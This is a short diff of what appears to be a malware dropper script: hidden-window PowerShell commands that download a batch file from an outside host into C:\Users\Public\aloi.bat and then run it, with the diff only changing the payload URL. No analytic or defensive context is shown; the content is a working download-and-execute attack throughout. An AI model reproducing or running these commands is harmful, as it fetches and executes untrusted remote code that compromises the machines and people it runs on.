@@ -1,2 +1,3 @@
-powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://term-owenr.co/d/thy1312312312312rewrwerwerwerwerwerwrw_tvfvfvf0303.bat', 'C:\Users\Public\aloi.bat')"
+powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://term-owenr.co/d/codegame.bat
+', 'C:\Users\Public\aloi.bat')"
 powershell.exe -WindowStyle Hidden -Command " C:\Users\Public\aloi.bat"
